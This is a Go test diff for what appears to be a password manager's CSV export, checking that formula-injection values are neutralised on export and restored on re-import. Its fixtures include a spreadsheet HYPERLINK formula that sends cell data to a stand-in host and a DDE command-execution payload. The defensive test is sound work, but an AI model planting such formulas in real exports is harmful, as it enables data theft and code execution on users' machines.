@@ -236,3 +236,38 @@ func TestFilename(t *testing.T) {
 		t.Fatal("filenames")
 	}
 }
+
+// A web page can choose a login's name and user (raypass.save_login): the CSV export must not
+// hand a spreadsheet a formula in those cells, and Raypass's own re-import must undo the guard.
+func TestCSVExportDefusesFormulas(t *testing.T) {
+	evil := `=HYPERLINK("https://evil.example/?"&J2,"x")`
+	items := []vault.Item{{ID: "0123456789abcdef", Type: vault.TypeLogin, Name: evil, Folder: "'@SUM(1)", User: "+cmd|' /C calc'!A0",
+		Pass: "-starts-with-dash", URLs: []string{"-x"}, Notes: "- a list"}}
+	data, err := ExportCSV(items)
+	if err != nil {
+		t.Fatal(err)
+	}
+	recs, err := readCSV(data)
+	if err != nil || len(recs) != 1 {
+		t.Fatal(err)
+	}
+	for _, col := range []string{"name", "folder", "login_username", "login_uri"} {
+		if v := recs[0][col]; formulaStart(v) {
+			t.Errorf("%s is a formula cell", col)
+		}
+	}
+	if recs[0]["login_password"] != "-starts-with-dash" || recs[0]["notes"] != "- a list" {
+		t.Error("secrets and notes must be exported unchanged")
+	}
+	r, err := Import(BitwardenCSV, data, "", vault.MinIter)
+	if err != nil || len(r.Items) != 1 {
+		t.Fatal(err)
+	}
+	got := r.Items[0]
+	if got.Name != evil || got.Folder != "'@SUM(1)" || got.User != items[0].User || got.URLs[0] != "-x" || got.Pass != items[0].Pass {
+		t.Fatalf("the round trip changed a value: %q %q %q", got.Name, got.Folder, got.URLs)
+	}
+	if unCSVSafe("'plain") != "'plain" {
+		t.Fatal("a leading ' that is not a guard must stay")
+	}
+}
